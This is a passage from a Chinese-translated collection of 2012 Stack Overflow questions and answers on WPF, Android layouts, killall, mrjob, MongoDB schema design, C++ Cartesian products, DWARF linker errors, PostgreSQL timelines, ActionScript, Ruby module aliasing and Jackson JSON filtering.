    while(numer > denomi)
    {
        numer -= denomi;
        reduceWhole += 1;
    }
    while (denomi % numer == 0)
    {
        int factor =  (int)denomi/numer;
        numer = 1;
        denomi = factor;
    }
    return new Fraction(reduceWhole, numer, denomi);

} 
```

# wpf - WPF 按钮 EventTrigger=Button.IsEnabledChanged

> ID：11091705
> 
> 赞同：1
> 
> 时间：2012-06-18T21:57:40.900
> 
> 标签：wpf, button, eventtrigger, routedevent, coloranimation

我想以两种方式**动画**按钮的颜色变化（基于其 IsEnabled 属性）：1）当它从启用更改为禁用时 - >颜色将从白色变为黑色。2) 当它从禁用变为启用时 -> 颜色将从黑色变为白色。

我正在尝试将**EventTrigger**与**RoutedEvent**一起使用，但只有一个名为 Button 的事件。**已启用更改**。

我有一个按钮，它的 IsEnabled 属性根据逻辑状态进行更改。状态机正在工作，但我想在按钮启用或禁用时更改按钮的颜色（使用 ColorAnimation）。

最好的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T00:05:15.237

定义如下样式：

```
<Style x:Key="ButtonEnabledStyle" TargetType="Button">
        <Setter Property="Background" Value="White" />
        <Style.Triggers>
            <Trigger Property="IsEnabled" Value="false" >
                <Setter Property="Background" Value="Black" />
            </Trigger>
        </Style.Triggers>
    </Style> 
```

然后将其分配给您的按钮，如下所示：

```
<Button Content="I'm a button" Style="{StaticResource ButtonEnabledStyle}" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-14T04:46:21.387

我希望您可以使用[EventTrigger](http://msdn.microsoft.com/en-us/library/system.windows.eventtrigger%28v=vs.110%29.aspx)，但它们仅适用于*路由*事件。您将使用的事件“ *IsEnabledChanged* ”*不是*路由事件，因此您不能使用 EventTrigger。但是，还有另一种方法，您可以使用[VisualStateManager](http://msdn.microsoft.com/en-us/library/system.windows.visualstatemanager%28v=vs.110%29.aspx)并为禁用和正常状态提供您自己的动画。

您可以在代码隐藏中执行动画，而不是使用 VisualStateManager，并且可能您可以声明自己的自定义[RoutedEvent](http://msdn.microsoft.com/en-us/library/system.windows.routedevent%28v=vs.110%29.aspx)。我的解决方案使用 VisualStateManager，其优点是它完全在 XAML 中执行。

[要使用 VisualStateManager，您将使用ControlTemplate](http://msdn.microsoft.com/en-us/library/system.windows.controls.controltemplate%28v=vs.110%29.aspx)创建一个样式，我的研究还没有发现任何其他方式。这需要您构建按钮的大部分显示功能。这是我的示例的启用和禁用状态的屏幕截图：

![ScreenShot.jpg![显示启用和禁用状态的屏幕截图](../Images/4fbac21b043a047efd8e2d7d504701cc.png)

为了模仿正常的按钮外观，我使用了两个矩形，一个在另一个之上，作为按钮的外观。看左上角：你可以看到按钮的深灰色顶部，它来自我的一个矩形，黑色底部来自我的另一个矩形。右侧的禁用外观使用相同的两个矩形，但动画将颜色更​​改为 White 和 WhiteSmoke。我为每个矩形提供一个[ColorAnimation 。](http://msdn.microsoft.com/en-us/library/system.windows.media.animation.coloranimation%28v=vs.110%29.aspx)

这是使用 VisualStateManager 的样式：

```
<Window.Resources>
    <Style TargetType="Button" x:Key="AnimatedStyle" >
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="Button">
                    <!-- Define our button's border. Note that
                         the text color is inherited by child 
                         elements, that is we give it a name, so 
                         we can target it with the animation -->
                    <Border BorderBrush="Black" BorderThickness="1" 
                            CornerRadius="2" 
                            TextBlock.Foreground="WhiteSmoke" 
                            Name="theBorder">
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition />
                                <RowDefinition />
                            </Grid.RowDefinitions>

                            <!-- To match the appearance of a typical button, 
                                 we use two rectangles -->
                            <Rectangle Name="topBackground" Fill="DarkGray"/>
                            <Rectangle Grid.Row="1" Name="bottomBackground" 
                                       Fill="Black" />

                             <!-- The content presenter shows the 
                                  button's text -->
                            <ContentPresenter Grid.RowSpan="2" 
                                      VerticalAlignment="Center" 
                                      HorizontalAlignment="Center" />
                        </Grid>
                        <VisualStateManager.VisualStateGroups>
                            <VisualStateGroup Name="CommonStates">

                                <!-- Here is where we define 
                                    the disable animation -->
                                <VisualState Name="Disabled">
                                    <Storyboard>
                                        <ColorAnimation 
                                              Storyboard.TargetName="topBackground"
                                              Storyboard.TargetProperty="(Rectangle.Fill).(Color)"
                                              To="White" Duration="0:0:.5" />
                                        <ColorAnimation 
                                              Storyboard.TargetName="bottomBackground"
                                              Storyboard.TargetProperty="(Rectangle.Fill).(Color)"
                                              To="WhiteSmoke" Duration="0:0:0.5" />
                                        <ColorAnimation 
                                              Storyboard.TargetName="theBorder"
                                              Storyboard.TargetProperty="(TextBlock.Foreground).(Color)"
                                              To="Gray" Duration="0:0:0.5" />
                                    </Storyboard>
                                </VisualState>

                                <!-- Here is where the enabled animation 
                                     is defined -->
                                <VisualState Name="Normal">
                                    <Storyboard>
                                        <ColorAnimation 
                                              Storyboard.TargetName="topBackground"
                                              Storyboard.TargetProperty="(Rectangle.Fill).Color"
                                              To="DarkGray" Duration="0:0:0.5" />
                                        <ColorAnimation 
                                              Storyboard.TargetName="bottomBackground"
                                              Storyboard.TargetProperty="(Rectangle.Fill).(Color)"
                                              To="Black" Duration="0:0:0.5" />
                                        <ColorAnimation 
                                              Storyboard.TargetName="theBorder"
                                              Storyboard.TargetProperty="(TextBlock.Foreground).Color"
                                              To="WhiteSmoke" Duration="0:0:0.5" />
                                    </Storyboard>
                                </VisualState>
                            </VisualStateGroup>
                        </VisualStateManager.VisualStateGroups>
                    </Border>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style>
</Window.Resources> 
```

下面是一些 XAML 来利用该样式并演示实际动画：

```
<Grid>
     <!--The button uses the style from above. Note that we control 
         whether it is enabled by binding the Enabled property to the checkbox's 
         property 'IsChecked', that way we don't need
         any code-behind -->
    <Button Content="Test Button" Name="btnTest" 
            IsEnabled="{Binding ElementName=chkEnabled,Path=IsChecked}" 
            Height="30" Margin="5" 
            Click="btnTest_Click"
            Style="{StaticResource AnimatedStyle}" />

    <CheckBox Grid.Column="1" Content="Enable Button" 
              Name="chkEnabled" IsChecked="True" VerticalAlignment="Center" />

    <Grid.ColumnDefinitions>
        <ColumnDefinition />
        <ColumnDefinition Width="auto" />
    </Grid.ColumnDefinitions>
</Grid> 
```

最后，只是为了证明按钮确实被禁用/启用，这里是整个代码隐藏（除了样板代码），通过单击按钮触发，但仅在启用时：

```
 private void btnTest_Click(object sender, RoutedEventArgs e) {
        MessageBox.Show("You clicked the button, it must be enabled.");
    } 
```

# android - 无法获得正确的布局

> ID：11091707
> 
> 赞同：0
> 
> 时间：2012-06-18T21:57:41.867
> 
> 标签：android, android-layout

以下是应用程序的布局。它在 下有两个视图`viewflipper`。在第二个视图中，有 3 行，第 1 行有 3 个按钮，第 2 行有图像，第 3 行有 3 个按钮。我希望第 1 行与屏幕顶部对齐，第 3 行与屏幕底部对齐，图像占据其间的其余空间。谁能告诉我如何做到这一点？

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:id="@+id/LinearLayout01"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
xmlns:android="http://schemas.android.com/apk/res/android"
android:orientation="vertical">

<ViewFlipper android:id="@+id/ViewFlipper01"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <!--adding views to ViewFlipper-->
      <!--view=1-->
    <LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

     <TextView
    android:id="@+id/tv1"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" 
    android:text="@string/hello"
    >
    </TextView>

<VideoView
android:id="@+id/myvideoview"
android:layout_width="wrap_content"
android:layout_height="match_parent" />

<Button
android:id="@+id/b"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:text="Button" />

    </LinearLayout>

       <!--view=2-->

    <LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <!--row 1-->
      <RelativeLayout 
android:layout_width="fill_parent" 
android:layout_height="wrap_content" 
android:layout_alignParentTop="true"
xmlns:android="http://schemas.android.com/apk/res/android"
>

    <Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:text="Back" />
    <Button
    android:id="@+id/button3"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentRight="true"
    android:text="Upload to Facebook" />
   <Button
    android:id="@+id/button2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_toLeftOf="@id/button3"
    android:text="Save" />

   </RelativeLayout>

       <!--row 2-->
    <RelativeLayout 
android:layout_width="wrap_content" 
android:layout_height="wrap_content" >
    <ImageView
    android:id="@+id/img"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />
    </RelativeLayout>

  <!--row 3-->   
    <RelativeLayout 
android:layout_width="wrap_content" 
android:layout_height="wrap_content" 
>
    <Button
    android:id="@+id/button4"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Previous" />
    <Spinner
    android:id="@+id/spinner"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_toRightOf="@id/button4">
</Spinner>
 <Button
    android:id="@+id/button5"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_toRightOf="@id/spinner"
    android:text="Next" />
 </RelativeLayout>

     </LinearLayout>

 </ViewFlipper>

 </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-21T13:19:58.490

用于`RelativeLayout`视图。

然后在第一行使用`android:layout_alignParentTop="true"`，在第三行使用`android:layout_alignParentBottom="true"`

最后，在中间的图像上使用`android:layout_below="@id/first_row" android:layout_above="@id/third_row"`for`fill_parent`尺寸。

# linux - ubuntu上的killall没有按预期工作查找进程名称

> ID：11091719
> 
> 赞同：0
> 
> 时间：2012-06-18T21:59:16.983
> 
> 标签：linux, unix, ubuntu

```
user@server:~$ ps fax | grep goh_launcher
11552 pts/2    S+     0:00              \_ grep --color=auto goh_launcher
 4273 ?        S      1:41 /usr/bin/php -q /usr/local/bin/goh_launcher.php

user@server:~$ killall -i goh_launcher.php
goh_launcher.php: nessun processo trovato

user@server:~$ killall -i goh_launcher.ph
Terminare goh_launcher.ph(4273)? (s/N) 
```

为什么寻找“goh_launcher.php”不起作用，而删除最后一个“p”使它起作用？

这是一个 Ubuntu LTS 12.04 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:27:00.180

从`killall`手册页：

> -e, --exact 要求非常长的名称完全匹配。**如果命令名称超过 15 个字符，则完整名称可能不可用（即被换出）。**在这种情况下，killall 将杀死前 15 个字符内匹配的所有内容。使用 -e，会跳过此类条目。如果除 -e 之外还指定了 -v，则 killall 为每个跳过的条目打印一条消息，

我相信您的第一个命令超过了该字符限制 1 个字符。

# hadoop - 根据映射器代码中的某些逻辑，将映射器中的一些数据（行）写入单独的目录

> ID：11091723
> 
> 赞同：1
> 
> 时间：2012-06-18T21:59:35.280
> 
> 标签：hadoop, elastic-map-reduce, mrjob

我正在使用 mrjob 来满足我的 EMR 需求。

如何根据我的映射器代码中的一些逻辑将一些数据（行）从我的映射器写入“单独的目录”：

1.  tar gzip 和

2.  作业完成/突然终止后上传到单独的 S3 存储桶（取决于目录名称）？

我猜 ' `--output-dir`' 选项只允许您将最终作业输出上传到该目录，但我想不时从我的映射器写入其他目录。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T19:07:04.577

我认为 Hadoop 的`MultipleOutput`功能可以帮助您，在您的自定义中`outputFormat`您可以指定路径和文件名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:14:59.200

**不，你不能在传统意义上。**

原因：当与 Hadoop 集群一起运行时，MrJob 内部使用 Hadoop 流来运行 map/reduce 作业我假设 Amazon Elastic M/R 与 Hadoop 集群相同。

它`--output-dir`实际上是 Hadoop 流的输入，它指定了 reducer 的输出将被收集到的位置。您不能使用此机制将数据分隔到不同的文件夹中。

[编辑：回应评论]

我的理解是boto只是一个连接亚马逊服务和访问ec2和s3等的库。

**我猜，在非传统意义上，您仍然可以写入不同的目录。**

我没有测试过这个想法，也不推荐这种方法。这就像打开一个文件并直接在减速器中写入它。理论上你可以这样做。而不是仅仅将 reducer 输出写入 std.out。您可以直接打开并写入 S3 对象。您必须确保在生成多个减速器时打开不同的文件。

这是我在将 MrJob 与 Hadoop 集群一起使用时学到的：http: [//pyfunc.blogspot.com/2012/05/hadoop-map-reduce-with-mrjob.html](http://pyfunc.blogspot.com/2012/05/hadoop-map-reduce-with-mrjob.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-19T20:34:59.520

您可以按照创建自定义 Jar 的方法并自定义您`OutputFormat`的，以便在不同的文件夹/文件中多路输出。您将创建一个子类并`MultipleTextOutputFormat`覆盖其中的一些方法（主要是）。`generateFileNameForKeyValue(Text key, Text value, String leaf)``generateActualKey(Text key, Text value)`

有关更多详细信息，您可以参考： http: [//www.infoq.com/articles/HadoopOutputFormat](http://www.infoq.com/articles/HadoopOutputFormat)

# php - 用于搜索和 CMS 的最有效的 JSON / mongodb 文档结构是什么？

> ID：11091728
> 
> 赞同：1
> 
> 时间：2012-06-18T21:59:56.100
> 
> 标签：php, json, mongodb

我正在研究一种可以轻松搜索的文档结构，同时保持可重建的结构。我的意思是文档本身包含 CMS 构建更新文档所需的表单所需的信息。

关键是永远不会知道文档的最终结构，因为它将通过 CMS 构建/修改。

目标是确保前端内容方法可以快速搜索，同时使 CMS 能够重建内容以便对其进行管理。我对让 CMS 的管理区域更努力地工作毫不犹豫，速度在那里并不那么重要。

**这是一个基本示例**

这是一个高度缩写的文件，但它可以说明我的观点。该文档相对容易查询，但它没有关于 CMS 如何显示它的结构信息。

```
{
"name" : "Page Name",
"title" : "Page Title",
"description" : "Page Description",
"page_heading" : "New Heading",
"content_body" : "<p>New Content</p>",
"slideshow" :
    [

        { 
        "image_title" : "Vacation Hawaii",
        "image_file" : "hawaii100.jpg"
        },
        { 
        "image_title" : "Vacation Spain",
        "image_file" : "Spain200.jpg"
        },
    ]
} 
```

**这是一个带有缩写结构数据的示例**

这种方法的问题是查询变得更加困难。

```
> db.posts.find( { page_heading.value : "example" } ) 
```

--

```
 {

"name" : "Page Name",
"title" : "Page Title",
"description" : "Page Description",

"page_heading" :
{

    "value" : "This is the page heading",
    "type" : "string",

},
"content_body" :
{

    "value" : "<p>HTML Content</p>",
    "type" : "html_textarea",

},
"slideshow" :
{
    "type" : 
    { 
        "image_title" : "string",
        "image_file" : "file"
    },
    "value" : 
    [
        { 
            "image_title" : "Vacation Hawaii",
            "image_file" : "hawaii100.jpg"
        },
        { 
            "image_title" : "Vacation Spain",
            "image_file" : "Spain200.jpg"
        },
    ]
}
} 
```

**替代方法**

拥有单独的文档，一个用于数据，一个用于模板，似乎是一种可能的解决方案，但会稍微增加后勤复杂性。

**链接到模板的内容文档**

```
 {
"name" : "Page Name",
"title" : "Page Title",
"description" : "Page Description",
"template" : "document_id",
"page_heading" : "New Heading",
"content_body" : "<p>New Content</p>",
"slideshow" :
    [

    { 
        "image_title" : "Vacation Hawaii",
        "image_file" : "hawaii100.jpg"
    },
    { 
        "image_title" : "Vacation Spain",
        "image_file" : "Spain200.jpg"
    },
    ]

} 
```

**模板文件**

```
{
"parent" : "document_id",
"page_heading" :
{

    "type" : "string",
    "required" : true

},
"content_body" :
{

    "type" : "html_textarea",
    "required" : true

},
"slideshow" :
{
    "type" : 
    { 
        "image_title" : "string",
        "image_file" : "file"
    }
}   
} 
```

最好的方法是什么？

我很有可能把整个事情复杂化了，而我面前有一个简单的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T16:11:11.947

很好的问题，我发现自己在很长一段时间内都摸不着头脑。我将简要介绍我所做的事情，但简而言之：是的，请务必将这些内容分开。我已经走得更远了，但话又说回来，我可能还有其他一些要求。

考虑以下。

*   An`Entity`可以是从 Product 到 Blogpost 的任何东西（由它的角色定义。一个实体可以有多个角色）。
*   安`Entity`有很多`Facts`。
*   关于一个实体的所有已知信息，如标题、描述、slug、英雄形象、作者等，都被保存`Fact`为该实体。
*   所有的写操作都只对`Facts`Facts 起作用。（换句话说，应用程序的编辑部分只关心事实，因为事实适用于任何类型的页面，我的编辑代码（当前实现为模态）适用于任何类型的页面）
*   `Facts`可以是任何给定类型，但该类型必须在`FactSchema`. CMS 允许`Factschema`动态创建 s，从而启用新类型的事实。
*   可以编辑事实的方式（例如，每个开放时间时段具有多个下拉菜单的开放时间）可能在其呈现方式上完全不同。因此我需要变压器的可能性（在写和读之间）。现在，您可能不需要这，但这使我得出以下结论：
*   `Facts`永远不会直接用于显示（因此阅读）页面。相反，当事实处于编辑模式时，它们只会延迟加载。这节省了很多带宽，因为很多东西，比如历史、正在进行的更改、允许的编辑角色等，都可以与事实一起保存
*   为了使`facts`每个实体可供阅读，每个实体都有一个`.c`（用于计算的）属性。每个`fact`创建/更改时都以事实名称作为该属性下的键保存（如果已定义，则应用转换器。）
*   当前的渲染方法是，`.c`在将生成的 JSON 扔到服务器端模板引擎进行渲染之前，我在对象中展平。（因此，所有属性都`.c`成为包含对象的属性）

就是这样。此外，在这些模型中定义了零表示逻辑，而是在 Mustache/Hogan 模板中定义。（如果我需要使用无逻辑模板扩展可能的功能，则使用几个混合的 javascript 函数，就表示逻辑而言）。

可以/应该根据 中定义的事实进行搜索`.c`。虽然我是通过 Elasticsearch 做到这一点的。

这是这 3 个模式声明（简化）（ps：模式在 Node.js 中，但这不应该打扰你）

```
 var fact= new Schema(
     {

        //_id undefined > defaulting to mongoDB objectid instead

        //factschema is looked-up by name
    name: { type: String, required: true, index: { unique: false }}

    //value can be any type, but for a particular instance the type is restricted as set in FactSchema.valueType
    ,value: {type:  {}, required: true} 

    ,createddate : { type: Date, required: true, default: Date.now, select: false }
 }

 var entity= new Schema(
   facts:  { type:[require('./fact')], select:false}
    ,roles: {type: [String], required: true, index: {unique: false}}    
    ,c: {type:  {}}  //all calculated stuff based on facts
 }

 var factSchema= new Schema({
     name: { type: String, required: true, index: { unique: true }}
     , valueType: { type: {}, required: true} //any type may be defined (simple types but also complex-types which have a ref to their own schema) , fact-instances are checked to adhere to the specified type  in pre-save handlers. 
     ,roles: {type: [String], required: true} //roles that are allowed to contain facts based on this factschema
     ,isMulti: {type: Boolean, required: true }

     //format to show edit-mode in.
     ,formFieldType: {type: String, required: true} 

     //ACL-stuff
     ,directChangeRoles: {type: [String]} //i.e: [super, admin,owner]
     ,suggestChangeRoles: {type: [String]} //ie: [editor]
} 
```

我必须说这很好用。嗯。

# c++ - 二维向量中元素的所有排列（笛卡尔积）

> ID：11091730
> 
> 赞同：0
> 
> 时间：2012-06-18T22:00:08.043
> 
> 标签：c++, multidimensional-array, matrix, permutation

这是我一直坚持的一小部分，它是更大任务的一部分。

我有一个二维向量，例如：

```
v1: 0 1 2 3 4  
v2: 0 1 2  
v3: 0 1 2 3 4  
v4: 0 1 2 3  
v5: 0 1 2 3 4 
```

（每一行都是一个向量）

我需要找到所有排列，从每一行中选择一个元素。正如有人指出的那样，这将是笛卡尔积。
我尝试使用循环，但这只会在一个方向上起作用（它错过了很多排列）
我还研究了 next_permutation，但我不确定是否可以将它应用于 2D 矢量。

此外，行数不是静态的，所以我不能嵌套 5 个循环，因为根据条件可能会有更多或更少的行。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:18:52.563

我将只写出一个可能的答案，这不是非常有效，但应该是可用的。

请注意，我假设（在您的示例中）您想要所有 5 元素组，第一个元素取自 v1，第二个元素取自 v2，第三个元素取自 v3，等等。

```
void gen_all (
    vector<vector<int> > & output_perms,
    vector<vector<int> > const & input,
    vector<int> & cur_perm,
    unsigned cur_row = 0
)
{
  if (cur_row >= input.size())
  {
    // This is where you have found a new permutation.
    // Do whatever you want with it.
    output_perms.push_back (cur_perm);
    return;
  }

  for (unsigned i = 0; i < input[cur_row].size(); ++i)
  {
    cur_perm.push_back (input[cur_row][i]);
    gen_all (output_perms, input, cur_perm, cur_row + 1);
    cur_perm.pop_back ();
  }
} 
```

像这样调用上面的函数：（假设`v`保存你的原始集合。）

```
vector<vector<int> > output;
vector<int> temp;
gen_all (output, v, temp); 
```

正如我之前所说，还有更高效和优雅的方法，上面的代码甚至可能无法编译（我只是在这里写的。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T22:11:50.313

`std::next_permutation`仅适用于一组迭代器。它不保留任何静态内存，它完全基于迭代器的当前状态。这意味着您一次可以在多个向量上使用它。不要试图一次置换整个结构。

# g++ - /usr/bin/ld: 矮人错误

> ID：11091731
> 
> 赞同：7
> 
> 时间：2012-06-18T22:00:13.713
> 
> 标签：g++, ld, nvcc, dwarf

我正在尝试使用 nvcc 编译一个复杂的应用程序，并且需要将编译器从 mpic++ 更改为 g++，因为我遇到了这个错误：

```
/usr/bin/ld: Dwarf Error: found dwarf version '3'，这个阅读器只处理版本 2 的信息。
```

什么是矮人？这个错误是什么意思？

有什么技巧可以解决吗？我在这里缺少什么有用的信息？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-19T14:00:19.553

如果清理 mpic++ 目标文件不能解决它，你可以告诉 g++ 不要发出 DWARF3 信息`-gdwarf-2 -gstrict-dwarf`

# wordpress - 服务条款内容储物柜

> ID：11091732
> 
> 赞同：0
> 
> 时间：2012-06-18T22:00:24.080
> 
> 标签：wordpress

我正在寻找一段代码，它将在显示我的服务条款的 wordpress 博客上弹出，并且为了查看页面的内容，他们需要点击“我接受”。我已经寻找了一些 wordpress 插件解决方案，但它们都没有按照我想要的方式工作。

有什么帮助吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T09:15:31.670

这个插件将解决您的问题 -[**内容警告**](http://wordpress.org/extend/plugins/content-warning-v2/)。

使用 Ajax 和 Thickbox，内容警告框会向用户显示一条消息，用户可以选择进入或离开站点。

安装插件并转到插件设置并启用它。

将 ENTER 和 EXIT 文本更新为 ACCEPT 和 DECLINE。同样在消息框中添加您的服务条款。

干杯！！！

# postgresql - 时间线和历史文件 postgresql 9.1

> ID：11091735
> 
> 赞同：4
> 
> 时间：2012-06-18T22:00:38.093
> 
> 标签：postgresql, postgresql-9.1

有人可以解释一下时间线和历史文件的用途以及 recovery.conf 中的“recovery_target_timeline”设置吗？

我从 postgresql 9.1 文档中得到的模糊理解是，当从属设备完成恢复时，它会切换到新的时间线以防止覆盖先前时间线的 WAL。我不清楚这在恢复方案中是如何使用的，以及 .history 文件的用途和“recovery_target_timeline”设置为“最新”。

我试图了解当我提升奴隶成为新主人时会发生什么。它在接受读/写查询之前恢复并启动新的时间线。

现在如果我设置一个新的从站，因为我将现有的从站提升为主站，它是否需要/使用前一个从站（新主站）生成的历史文件来读取（由新主站）生成的新 WAL 以进行连续归档/日志航运。

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T03:47:50.383

要了解时间线，您必须了解的是它们是为了避免 MVCC 和时间线分歧的问题。考虑这一点的一个好方法是在复制的上下文中。在主/从流复制中，您不希望有人将从属作为主插入一堆信息，然后将其转回从属。如果这样做，WAL 段的二进制日志将无法正常运行，并且您将获得 db 损坏。

当您将奴隶恢复到新的主人时，它会完成“恢复”并开始自己的时间线。从这一点开始，它现在是主人，如果没有重建，就不能再成为奴隶。这给故障转移和故障恢复带来了一些问题，但这样做的方法是定期来回故障，旧主服务器重建数据库（使用`pg_basebackup`）作为新的从服务器。这意味着每次故障转移/故障恢复都是一个新的时间线。

是的，这确实会影响多台服务器的故障转移，因为从属服务器必须更改时间线。

# actionscript-3 - 1119：通过静态类型 flash.utils:Timer 的引用访问可能未定义的属性 alpha。

> ID：11091736
> 
> 赞同：2
> 
> 时间：2012-06-18T22:00:38.200
> 
> 标签：actionscript-3

我遇到了这个脚本的问题......除了点击之外，它的一切都在工作。这是一个二进制时钟，我想把灯调暗

```
package{
import flash.events.MouseEvent;
import flash.display.MovieClip;
import flash.utils.Timer;
import flash.events.TimerEvent;
import com.greensock.*;
import com.greensock.easing.*;
import flash.events.TouchEvent;

public class Main extends MovieClip
{
    var clock:Timer=new Timer(1000);
    var date:Date=new Date();
    var hr:int;
    var min:int;
    var sec:int;
    var bits:Array;

    public function Main()
    {
        init();
        tvinnet.addEventListener(MouseEvent.MOUSE_OVER, fl_MouseOverHandler);
    }

    private function init():void
    {
        sec=date.getSeconds();
        min=date.getMinutes();
        hr=date.getHours();
        turnBits(converter(sec),'S');
        turnBits(converter(min),'M');
        turnBits(converter(hr),'H');
        clock.start();
        clock.addEventListener(TimerEvent.TIMER, setTime);

    }

    function fl_MouseOverHandler(e:MouseEvent):void
    {
            clock.alpha = 0;
    }

    private function setTime(e:TimerEvent):void
    {
        date=new Date();
        sec=date.getSeconds();
        min=date.getMinutes();
        hr=date.getHours();
        turnBits(converter(sec),'S');
        turnBits(converter(min),'M');
        turnBits(converter(hr),'H');
    }

    private function dec2bin(dec:int, length:int)
    {
        var bin:Array= new Array();
        while((dec/2)>0)
        {
            bin.push(dec%2);
            dec=dec/2;
        }
        while(bin.length<length) bin.push(0);
        return bin;
    }

    private function converter(num:int)
    {
        var st:String=String(num);
        if(st.length==1)st='0'+st;
        var fDigit:int=int(st.charAt(1));
        var sDigit:int=int(st.charAt(0));
        var fColumn:Array=dec2bin(fDigit,4);
        var sColumn:Array=dec2bin(sDigit,3);
        var result:Array=fColumn.concat(sColumn);
        return result;
    }

    private function turnBits(newBits:Array, target:String)
    {
        for(var a:int=0;a<newBits.length;a++)
        {
            if((a!=6)||(target!="H"))
            {
                if(newBits[a]==0) TweenMax.to(this.getChildByName(target+String(a)), 1, {glowFilter:{color:0x00cbff, alpha:0, blurX:15, blurY:15,strength:1},alpha:.1});
                else TweenMax.to(this.getChildByName(target+String(a)), 1, {glowFilter:{color:0x00cbff, alpha:1, blurX:20, blurY:20,strength:.8},alpha:1});
            }
        }
    }
} 
```

}

所以如果你很棒，你能在里面找到什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:07:10.577

您将时钟变量定义为 Timer，然后您尝试访问它在 Timer 中不可用的 alpha 属性。

```
function fl_MouseOverHandler(e:MouseEvent):void
    {
            clock.alpha = 0; //wrong approach, use this.alpha = 0;
    } 
```

# ruby - 是否可以在 Ruby 中为模块创建别名？

> ID：11091740
> 
> 赞同：29
> 
> 时间：2012-06-18T22:00:47.730
> 
> 标签：ruby, module, alias

在 Python 中，您可以使用 'as' 为模块设置别名：

```
import mymodule as mm 
```

但我似乎找不到红宝石的等价物。我知道你可以`include`而不是`require`一个模块，但这有命名空间冲突的风险。是否有任何等效于 Python 模块别名的方法？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-06-18T22:04:21.163

Ruby 中的模块并没有那么特别，因此您可以将它们分配给另一个常量：

```
[4] (pry) main: 0> module TestModule
[4] (pry) main: 0*   def self.foo
[4] (pry) main: 0*     "test"
[4] (pry) main: 0*   end  
[4] (pry) main: 0* end  
=> nil
[5] (pry) main: 0> tm = TestModule
=> TestModule
[6] (pry) main: 0> tm.foo
=> "test" 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-06-18T22:36:22.367

迈克尔的回答似乎解决了你的问题......不过，我读了这个问题有点不同，发现了一些我认为值得分享的非常好的东西。

我将您的问题理解为：“如果我想需要两个同名的模块，我该怎么办？”，也就是说，如果需要两个模块会导致命名空间冲突，我该如何为它们取别名？因为，就我对 Python 的“import ... as ...”的理解而言，它也解决了这些问题。Ruby 中的一个示例：

```
#file a.rb
module A
  def self.greet
    puts 'A'
  end
end

#file b.rb
module A
  def self.greet
    puts 'other A'
  end
end 
```

现在，如果我要在第三个文件中执行此操作：

```
require_relative 'a'
require_relative 'b'

A.greet # => other A 
```

第一个 A 将被 b.rb 中的 A 完全覆盖。使用迈克尔的技巧也无济于事：

```
require_relative 'a'
TMP_A = A
A.greet # => A
TMP_A.greet # => A
require_relative 'b'
TMP_A2 = A
A.greet # => other A
TMP_A2.greet # => other A
TMP_A.greet # => other A :( 
```

太糟糕了。然后我想，嗯，在 Ruby 中，几乎无处不在`dup`，可以克隆基本上所有的东西，并且没有太多希望，我只是输入了这个并重新运行了程序：

```
require_relative 'a'
TMP_A = A.dup
A.greet # => A
TMP_A.greet # => A
require_relative 'b'
TMP_A2 = A
A.greet # => other A
TMP_A2.greet # => other A
TMP_A.greet # => A :P 
```

这让我很开心，希望你们也能欣赏它。现在我想起来了，它是有道理的——一个模块毕竟是一个像任何其他对象一样的对象，那么为什么不应该`dup`工作呢？

# json - 从 Jackson JSON 过滤属性

> ID：11091745
> 
> 赞同：1
> 
> 时间：2012-06-18T22:01:29.923
> 
> 标签：json, spring-mvc, jackson

我正在使用 Spring MVC Annotations 创建一个 JSON Rest API，其方法定义如下：

```
@RequestMapping(value = "/authenticate", method = RequestMethod.POST)
public @ResponseBody AuthenticationResponse authenticate(@RequestBody final DeviceInformation deviceInformation)
            throws AuthenticationException {
    return createAuthenticationResponse(deviceInformation, false);
} 
```

为了处理不同的客户端版本，我想通过使用注释来排除或包含序列化 bean 的属性

```
class AuthenticationResponse {
    @InterfaceVersion(max = 2) 
    String old;

    @InterfaceVersion(min = 3)
    String new;
} 
```

因此，如果客户端使用 InterfaceVersion 2 调用，他将不会获得**新**属性，如果他使用 3 调用，他将不会获得**旧**属性。

我已经发现 Jackson 库（Spring 用于 JSON）提供了 JsonView、JsonFilter 等功能，但我无法弄清楚我必须在哪里以及如何配置这些东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-21T17:29:10.610

